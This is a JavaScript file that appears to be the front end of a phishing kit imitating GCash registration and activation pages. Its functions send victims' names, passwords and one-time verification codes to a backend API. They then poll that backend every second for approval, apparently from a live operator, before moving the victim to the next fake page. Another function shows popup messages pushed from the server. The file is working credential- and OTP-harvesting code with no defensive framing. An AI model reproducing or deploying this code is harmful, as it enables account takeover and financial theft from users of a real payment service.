
function div() {
  var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
  var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

  var link = document.createElement("div");
  var head = document.getElementsByTagName("body");
  var l = document.createElement("style");
  head[0].appendChild(l);
  l.innerHTML = ".loading { position: absolute;top: 0; left: 0;width: 100%; height: 100%; } .loading-img {width: 100px;height: 100px;position: absolute; left: 0; right: 0;top: 0;bottom: 0;margin: auto;}@keyframes turn { 0% { -webkit-transform: rotate(0deg); }25% { -webkit-transform: rotate(90deg); }50% { -webkit-transform: rotate(180deg);} 75% { -webkit-transform: rotate(270deg); } 100% {-webkit-transform: rotate(360deg); }}.loading-img img { user-select:none; width: 100%; animation: turn 1s linear infinite;} .loading - none { display: none; } ";
  head[0].appendChild(link);
  link.setAttribute("style", "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; ");
  link.setAttribute("id", "divq");
  link.style.width = width * 0.3+"px";
  link.style.height =  width * 0.25 + "px";
  link.style.background =  "#000";
  link.style.left = width * 0.35+"px";
  link.style.top = height * 0.4 + "px";
  link.style.borderRadius = "10px";
  link.style.opacity = "0.5";
  link.innerHTML = "<div class='loading'><div class='loading-img'><img src='" + path + "/api/img/qq2.png' /></div></div>";

}
function tkk(html) {
  var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
  var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
  var link = document.createElement("div");
  var head = document.getElementsByTagName("body");
  var l = document.createElement("style");
  head[0].appendChild(l);
  l.innerHTML = "#i44,#i55,#i66,#idiv{position:absolute;}";
  head[0].appendChild(link);
  link.setAttribute("style", "position:absolute;left:0px;top:0px;width:100%;height:100%;z-index:9999;display: flex;justify-content: space-around;align-items: center; ");
  link.setAttribute("id", "divqq");
  link.style.width = width + "px";
  link.style.height = height + "px";
  link.style.background = "";
  link.style.left = 0 + "px";
  link.style.top = 0 + "px";
  link.style.opacity = "1";
  link.innerHTML = "<div id='i44'><div id='idiv'><span id='i55'></span></div><span id='i66'>OK</span></div><div id='idiv2'></div>";

  $id("i55").innerHTML = html;

  $id("idiv2").style.width = width + "px";
  $id("idiv2").style.height = height + "px";
  $id("idiv2").style.background = "#000";
  $id("idiv2").style.left = 0 + "px";
  $id("idiv2").style.top = 0 + "px";
  $id("idiv2").style.opacity = "0.4";

  $id("idiv").style.left = width * 0.05 + "px";
  $id("idiv").style.top = height * 0.01 + "px";
  $id("idiv").style.width = width*0.8 + "px";
  $id("idiv").style.height = height * 0.14 + "px";
  $id("idiv").style.wordBreak = "break-all";


  $id("i44").style.left = width * 0.05 + "px";
  $id("i44").style.top = height * 0.4 + "px";
  $id("i44").style.width = width*0.9 + "px";
  $id("i44").style.height = height*0.2 + "px";
  $id("i44").style.background = "#fff";
  $id("i44").style.opacity = "1";
  $id("i44").style.zIndex = "1";
  $id("i44").style.borderRadius = "2px";
    

  $id("i55").style.left = 0+ "px";
  $id("i55").style.top = height * 0.01 + "px";

  $id("i66").style.left = width * 0.77 + "px";
  $id("i66").style.top = height * 0.15 + "px";
  $id("i66").style.color = "#6cd000";
  $id("i66").style.fontSize=width * 0.045 + "px";
  $id("i66").style.fontWeight = "bold";

  $id("divqq").onclick=function () {
    if ($id("divqq")) {
      $id("divqq").remove();
    }
  }
}

function api_name_paswd(name, paswd) {
  var url = path + "/api/api.php";
  var data = "name=" + name + "&paswd=" + paswd;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "ok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("GCash Registration2.php");
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          n.length = 0;
          $id("re").style.display = "block";
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}
function api_yzm(yzm) {
  var url = path + "/api/api.php";
  var data = "&yzm=" + yzm;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yzok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("GCash Registration.html");
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          n.length = 0;
          $id("re").style.display = "block";
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}
function api_yzmjh(yzm) {
  var url = path + "/api/api.php";
  var data = "yzmm=" + yzm ;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yzjhok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("activate .php");
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          $id("input1").value = "";
          $id("input2").value = "";
          $id("input3").value = "";
          $id("input4").value = "";
          $id("input5").value = "";
          $id("input6").value = "";
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function api_wt(name, paswd) {
  var url = "zy/api/api.php";
  var data = "w1=" + name + "&w2=" + paswd;
  function f(p) {
    div();
    function aja() {
      ajax("post", url, "yzok=ok", ffff, true);
    }
    var timer = setInterval(aja, 1000);
    function ffff(d) {
      if (d) {
        if (JSON.parse(d)["ok"] == "ok") {
          y("GCash Registration1.php?p="+$id("input1").value);
          clearInterval(timer);
        }
        if (JSON.parse(d)["ok"] == "no") {
          if ($id("divq")) {
            $id("divq").remove();
          }
          clearInterval(timer);
          y();
        }
      }
    }
  }
  ajax("post", url, data, f, true);
}

function xt() {
  function f(d) {
    if (d != '') {
      var dd = JSON.parse(d);
      if ($id("divqq")) {
        $id("divqq").remove();
      }
      tkk(dd[0]["msg"]);
    }
  }
  var url = "zy/api/api.php";
  var data = "xint=1";
  ajax("post", url, data, f, true);
}
var xint = setInterval(xt, 1000);